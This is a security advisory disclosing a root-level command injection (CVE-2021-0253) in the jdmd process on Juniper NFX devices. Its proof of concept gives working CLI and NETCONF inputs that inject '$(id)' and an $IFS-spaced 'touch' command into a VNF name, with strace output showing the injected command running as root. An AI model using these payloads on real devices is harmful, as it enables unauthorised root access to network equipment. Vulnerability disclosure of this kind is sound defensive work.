# Junos OS: NFX Series: Local Command Execution Vulnerability in JDMD Leads to Privilege Escalation (CVE-2021-0253)

High

[orange-cert-cc](/orange-cert-cc)
published
GHSA-vrf9-cjcp-rwcr
Nov 24, 2021

## Package

Junos OS
(Juniper)

## Affected versions

19.2R1.8
19.1R2

## Patched versions

None

## Description

### Overview

On Juniper NFX product, a command injection is possible from management plan (CLI/Netconf) on jdmd process resulting on execution with full privileges on the host.

### Details

Some user inputs from management plan are concatenated into an XML and sent to jdmd. At the XML reception jdmd execute some commands/scripts with these user inputs as parameters by using popen().

popen() is dangerous as it executes shell commands wich makes parameters interpretable.

This vulnerability is applicable to most of the unvalidated user inputs sent to jdmd and that are used as script parameters.

jdmd run as root on a privileged container making jdmd run at the highest privilege level on the host.

(Also there is some dangerous file system mapping with the host that makes container escape possibility easier)

### Proof of Concept

Via cli:

```
user> show virtual-network-functions "user$(id)"

```

Via netconf:

```
<?xml ?>
<rpc>
  <get-virtual-network-functions-information>
     <vnf-name>cyrillec$(id)</vnf-name>
  </get-virtual-network-functions-information>
</rpc>

```

It results on "id" command execution by jdmd:

```
root@local-node:~# strace -f -s 4096 -e execve -p <pid of jdmd>
Process 12218 attached
Process 18947 attached
[pid 18947] execve("/bin/sh", ["sh", "-c", "/usr/sbin/vnf_info.py -n  \"user$(id)\""], [/* 10 vars */]) = 0
Process 18948 attached
Process 18949 attached
[pid 18949] execve("/usr/bin/id", ["id"], [/* 9 vars */]) = 0
[pid 18949] +++ exited with 0 +++
[pid 18948] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=9438, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
[pid 18948] +++ exited with 0 +++
[pid 18947] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=9437, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
[pid 18947] execve("/usr/sbin/vnf_info.py", ["/usr/sbin/vnf_info.py", "-n", "useruid=0(root) gid=0(wheel) groups=0(wheel),5(operator),10(field),31(guest),73(config)"], [/* 9 vars */]) = 0
[pid 18947] +++ exited with 0 +++
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=9436, si_uid=0, si_status=0, si_utime=8, si_stime=4} ---

```

It is also possible to use space in the injection by using $IFS. For instance:

```
user> show virtual-network-functions "cyrillec$(touch$IFS/tmp/user)"

```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
